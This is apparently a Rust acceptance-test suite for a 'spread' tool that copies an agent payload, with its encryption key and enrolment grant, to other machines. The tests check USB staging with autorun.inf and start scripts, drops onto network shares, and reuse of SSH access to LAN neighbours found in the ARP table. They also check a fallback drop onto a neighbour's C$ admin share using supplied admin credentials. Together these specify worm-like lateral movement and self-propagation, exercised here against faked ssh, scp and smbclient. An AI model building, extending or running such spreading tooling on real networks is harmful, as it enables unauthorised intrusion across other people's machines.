#![cfg(unix)]

//! Spread acceptance: USB staging, share staging, and SSH reuse over a fake LAN.

use std::{
    fs,
    net::TcpListener,
    os::unix::fs::PermissionsExt,
    path::{Path, PathBuf},
    process::Command,
};

use serde_json::Value;
use tempfile::TempDir;

fn payload() -> TempDir {
    let dir = TempDir::new().unwrap();
    fs::write(dir.path().join("agentd"), b"binary").unwrap();
    fs::write(dir.path().join("enc.key"), [1_u8; 32]).unwrap();
    fs::write(dir.path().join("config.toml"), "channel = \"relay\"\n").unwrap();
    fs::write(dir.path().join("coordinator.pub"), [9_u8; 32]).unwrap();
    fs::write(dir.path().join("enrolment.grant"), b"grant\n").unwrap();
    dir
}

fn spread() -> Command {
    Command::new(env!("CARGO_BIN_EXE_spread"))
}

fn output(command: &mut Command) -> (bool, Value) {
    let result = command.output().expect("spread runs");
    let text = String::from_utf8_lossy(&result.stdout).into_owned();
    let value = serde_json::from_str(&text).unwrap_or(Value::Null);
    (result.status.success(), value)
}

#[test]
fn usb_stages_once_and_force_restages() {
    let payload = payload();
    let mounts = TempDir::new().unwrap();
    let fresh = mounts.path().join("usb1");
    let used = mounts.path().join("usb2");
    fs::create_dir_all(&fresh).unwrap();
    fs::create_dir_all(&used).unwrap();
    fs::write(used.join(".agentfleet-id"), b"old").unwrap();

    let (ok, report) = output(
        spread()
            .arg("--payload")
            .arg(payload.path())
            .arg("--state")
            .arg(mounts.path())
            .arg("--mode")
            .arg("usb")
            .arg("--mount-root")
            .arg(mounts.path()),
    );
    assert!(ok, "{report}");
    let status = |name: &str| -> String {
        report["usb"]
            .as_array()
            .unwrap()
            .iter()
            .find(|item| {
                item["target"]
                    .as_str()
                    .is_some_and(|path| path.ends_with(name))
            })
            .map(|item| item["status"].as_str().unwrap_or_default().to_owned())
            .unwrap_or_default()
    };
    assert_eq!(status("usb1"), "staged");
    assert_eq!(status("usb2"), "skipped");
    assert!(fresh.join("agentfleet/agentd").is_file());
    assert!(fresh.join("agentfleet/autorun.inf").is_file());
    assert!(fresh.join("agentfleet/start.cmd").is_file());
    let mode = fs::metadata(fresh.join("agentfleet/start.sh"))
        .unwrap()
        .permissions()
        .mode();
    assert_eq!(mode & 0o111, 0o111, "start.sh must be executable");
    let marker: Value =
        serde_json::from_slice(&fs::read(fresh.join(".agentfleet-id")).unwrap()).unwrap();
    assert_eq!(marker["grant"], true);

    // A second pass is a no-op, and --force restages.
    let (_, report) = output(
        spread()
            .arg("--payload")
            .arg(payload.path())
            .arg("--state")
            .arg(mounts.path())
            .arg("--mode")
            .arg("usb")
            .arg("--mount-root")
            .arg(mounts.path()),
    );
    assert!(report["usb"]
        .as_array()
        .unwrap()
        .iter()
        .all(|item| item["status"] == "skipped"));
    let (ok, _) = output(
        spread()
            .arg("--payload")
            .arg(payload.path())
            .arg("--state")
            .arg(mounts.path())
            .arg("--mode")
            .arg("usb")
            .arg("--mount-root")
            .arg(mounts.path())
            .arg("--force"),
    );
    assert!(ok);
}

#[test]
fn dry_run_does_not_write() {
    let payload = payload();
    let mounts = TempDir::new().unwrap();
    let drive = mounts.path().join("usb");
    fs::create_dir_all(&drive).unwrap();
    let (ok, report) = output(
        spread()
            .arg("--payload")
            .arg(payload.path())
            .arg("--state")
            .arg(mounts.path())
            .arg("--mode")
            .arg("usb")
            .arg("--mount-root")
            .arg(mounts.path())
            .arg("--dry-run"),
    );
    assert!(ok);
    assert_eq!(report["usb"][0]["reason"], "dry run");
    assert!(!drive.join("agentfleet").exists());
}

#[test]
fn missing_coordinator_key_is_rejected() {
    let payload = payload();
    fs::remove_file(payload.path().join("coordinator.pub")).unwrap();
    let state = TempDir::new().unwrap();
    let result = spread()
        .arg("--payload")
        .arg(payload.path())
        .arg("--state")
        .arg(state.path())
        .arg("--dry-run")
        .output()
        .unwrap();
    assert_eq!(result.status.code(), Some(2));
    assert!(String::from_utf8_lossy(&result.stderr).contains("coordinator.pub"));
}

fn fake(name: &str, body: &str, bin: &Path) {
    let path = bin.join(name);
    fs::write(&path, body).unwrap();
    fs::set_permissions(&path, fs::Permissions::from_mode(0o755)).unwrap();
}

fn fake_lan() -> TempDir {
    let bin = TempDir::new().unwrap();
    fake(
        "ip",
        "#!/bin/sh\nprintf '127.0.0.2 dev lo lladdr aa REACHABLE\\n127.0.0.3 dev lo lladdr bb STALE\\n'\n",
        bin.path(),
    );
    fake(
        "ssh",
        r#"#!/usr/bin/env python3
import os, sys
host = sys.argv[-2].split("@")[-1]
command = sys.argv[-1]
present = os.path.exists(os.path.join(os.environ["REMOTE"], ".agent-fleet", ".spread"))
if command.startswith("test -e"):
    ok = present
    if present:
        print("present")
else:
    ok = host != "127.0.0.3"
    if "touch ~/.agent-fleet/.spread" in command:
        dest = os.path.join(os.environ["REMOTE"], ".agent-fleet")
        os.makedirs(dest, exist_ok=True)
        open(os.path.join(dest, ".spread"), "w").write("x")
with open(os.path.join(os.environ["REMOTE"], "ssh.log"), "a") as log:
    log.write(f"{host} {command}\n")
sys.exit(0 if ok else 1)
"#,
        bin.path(),
    );
    fake(
        "scp",
        r#"#!/usr/bin/env python3
import os, shutil, sys
source, target = sys.argv[-2], sys.argv[-1]
dest = os.path.join(os.environ["REMOTE"], ".agent-fleet")
os.makedirs(dest, exist_ok=True)
shutil.copytree(source, dest, dirs_exist_ok=True)
"#,
        bin.path(),
    );
    bin
}

#[test]
fn lan_reuses_ssh_and_reports_hosts() {
    let payload = payload();
    let state = TempDir::new().unwrap();
    let remote = TempDir::new().unwrap();
    let bin = fake_lan();
    // Both neighbours must accept the probe port.
    let first = TcpListener::bind("127.0.0.2:0").unwrap();
    let port = first.local_addr().unwrap().port();
    let second = TcpListener::bind(("127.0.0.3", port)).unwrap();
    std::thread::spawn(move || {
        for listener in [first, second] {
            for _ in 0..4 {
                let _ = listener.accept();
            }
        }
    });

    let path = format!(
        "{}:{}",
        bin.path().display(),
        std::env::var("PATH").unwrap_or_default()
    );
    let (ok, report) = output(
        spread()
            .arg("--payload")
            .arg(payload.path())
            .arg("--state")
            .arg(state.path())
            .arg("--mode")
            .arg("lan")
            .arg("--port")
            .arg(port.to_string())
            .arg("--key")
            .arg("/tmp/fake-key")
            .arg("--user")
            .arg("tester")
            .env("PATH", path)
            .env("REMOTE", remote.path()),
    );
    assert!(ok, "{report}");
    assert_eq!(report["lan"][0]["status"], "staged");
    assert_eq!(report["lan"][1]["status"], "skipped");
    assert!(remote.path().join(".agent-fleet/agentd").is_file());
    assert!(remote.path().join(".agent-fleet/.spread").is_file());
    let log = fs::read_to_string(remote.path().join("ssh.log")).unwrap();
    assert!(log.contains("127.0.0.2 echo ok"), "{log}");
    assert!(log.contains("touch ~/.agent-fleet/.spread"), "{log}");
}

#[test]
fn share_gets_a_host_specific_directory() {
    let payload = payload();
    let state = TempDir::new().unwrap();
    let share = TempDir::new().unwrap();
    let (ok, report) = output(
        spread()
            .arg("--payload")
            .arg(payload.path())
            .arg("--state")
            .arg(state.path())
            .arg("--mode")
            .arg("shares")
            .arg("--share")
            .arg(share.path()),
    );
    assert!(ok, "{report}");
    assert_eq!(report["shares"][0]["status"], "staged");
    let entries: Vec<PathBuf> = fs::read_dir(share.path())
        .unwrap()
        .filter_map(Result::ok)
        .map(|entry| entry.path())
        .collect();
    assert_eq!(entries.len(), 1);
    assert!(entries[0].join("agentfleet/agentd").is_file());
}

fn fake_smb(root: &Path, bin: &Path) {
    let path = bin.join("smbclient");
    std::fs::write(
        &path,
        r#"#!/usr/bin/env python3
import os, re, shutil, sys
if "--version" in sys.argv:
    print("smbclient 4.0")
    sys.exit(0)
host = sys.argv[1].strip("/").split("/")[0]
script = sys.argv[sys.argv.index("-c") + 1]
for src, dst in re.findall(r'put "([^"]+)" "([^"]+)"', script):
    target = os.path.join(os.environ["SMB_ROOT"], host, dst)
    os.makedirs(os.path.dirname(target), exist_ok=True)
    shutil.copy(src, target)
with open(os.path.join(os.environ["SMB_ROOT"], "argv.log"), "a") as log:
    log.write(" ".join(sys.argv) + "\n")
"#,
    )
    .unwrap();
    std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o755)).unwrap();
    let _ = root;
}

#[test]
fn smb_drops_the_payload_when_ssh_is_closed() {
    let payload = payload();
    let state = TempDir::new().unwrap();
    let remote = TempDir::new().unwrap();
    let bin = fake_lan();
    fake_smb(remote.path(), bin.path());
    // Port 22 closed; SMB open on an ephemeral port.
    let smb = TcpListener::bind("127.0.0.2:0").unwrap();
    let smb_port = smb.local_addr().unwrap().port();
    std::thread::spawn(move || {
        for _ in 0..4 {
            let _ = smb.accept();
        }
    });
    let path = format!(
        "{}:{}",
        bin.path().display(),
        std::env::var("PATH").unwrap_or_default()
    );
    let (ok, report) = output(
        spread()
            .arg("--payload")
            .arg(payload.path())
            .arg("--state")
            .arg(state.path())
            .arg("--mode")
            .arg("lan")
            .arg("--port")
            .arg("9")
            .arg("--smb-port")
            .arg(smb_port.to_string())
            .arg("--smb-user")
            .arg("admin")
            .arg("--smb-pass")
            .arg("secret")
            .env("PATH", path)
            .env("SMB_ROOT", remote.path()),
    );
    assert!(ok, "{report}");
    let entry = &report["lan"][0];
    assert_eq!(entry["status"], "staged", "{report}");
    assert!(entry["reason"]
        .as_str()
        .unwrap_or_default()
        .contains("smb drop"));
    let dropped = remote.path().join("127.0.0.2");
    assert!(dropped.join("agentd").is_file());
    assert!(dropped.join("start.cmd").is_file());
    let argv = fs::read_to_string(remote.path().join("argv.log")).unwrap();
    assert!(argv.contains("//127.0.0.2/C$"), "{argv}");
    assert!(argv.contains("-U admin%secret"), "{argv}");
}
